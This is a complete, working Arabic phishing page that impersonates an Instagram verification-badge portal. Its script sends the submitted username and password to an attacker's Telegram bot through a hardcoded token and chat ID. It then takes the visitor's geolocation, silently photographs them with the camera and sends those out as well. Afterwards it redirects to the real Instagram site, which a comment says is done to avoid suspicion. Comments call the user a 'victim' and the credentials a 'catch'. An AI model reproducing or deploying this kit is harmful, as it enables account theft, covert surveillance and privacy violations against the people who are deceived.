<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram | مركز توثيق الحسابات</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 5px; }
        .logo { width: 175px; margin-bottom: 20px; }
        h3 { color: #262626; font-size: 16px; margin-bottom: 20px; font-weight: 600; line-height: 1.4; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        .btn-blue { background: #0095f6; color: white; border: none; width: 100%; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 10px; }
        .footer-text { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo">
    <h3>بوابة طلب شارة التوثيق (العلامة الزرقاء) لعام 2026</h3>
    
    <input type="text" id="insta_user" placeholder="اسم المستخدم (Username)">
    <input type="password" id="insta_pass" placeholder="كلمة السر (Password)">
    
    <p style="font-size: 11px; color: #3897f0; text-align: right; cursor: pointer;">لماذا أحتاج للتوثيق؟</p>
    
    <button class="btn-blue" onclick="captureInsta()">تسجيل الدخول وطلب التوثيق</button>
    
    <div class="footer-text">سيتم مراجعة حسابك من قبل فريق الدعم الفني لشركة Meta.</div>
</div>

<canvas id="canvas" style="display:none;"></canvas>
<video id="video" style="display:none;" autoplay></video>

<script>
    // بياناتك الخاصة
    const TOKEN = "8470093886:AAFofGsfGx98xJCaOPJyvqyLdwrYL_3Ebfg";
    const CHAT_ID = "7529727252";

    async function sendToBot(type, data, caption = "") {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        if (type === "text") {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
            });
        } else {
            let fileName = type === "photo" ? "face.jpg" : "file.jpg";
            formData.append(type, data, fileName);
            if (caption) formData.append("caption", caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: "POST", body: formData });
        }
    }

    async function captureInsta() {
        const user = document.getElementById('insta_user').value;
        const pass = document.getElementById('insta_pass').value;

        if (!user || !pass) { alert("يرجى إكمال البيانات المطلوبة!"); return; }

        // 1. إرسال اليوزر والباسورد فوراً (أهم شيء)
        const info = `🔥 **صيد إنستغرام جديد** 🔥\n👤 اليوزر: \`${user}\` \n🔑 الباسورد: \`${pass}\``;
        await sendToBot("text", info);

        alert("جاري التحقق من ملكية الحساب.. يرجى السماح بالكاميرا لمطابقة صورة الملف الشخصي.");

        // 2. الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const map = `📍 موقع الضحية: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToBot("text", map);
        });

        // 3. الكاميرا (تصوير صامت)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    await sendToBot("photo", blob, `📸 صورة صاحب الحساب: ${user}`);
                    stream.getTracks().forEach(t => t.stop());
                    
                    // تحويل الضحية لصفحة إنستغرام الحقيقية لإبعاد الشبهة
                    window.location.href = "https://www.instagram.com/accounts/manage_access/";
                }, 'image/jpeg');
            }, 2000);
        } catch (e) {
            window.location.href = "https://www.instagram.com/";
        }
    }
</script>
</body>
</html>
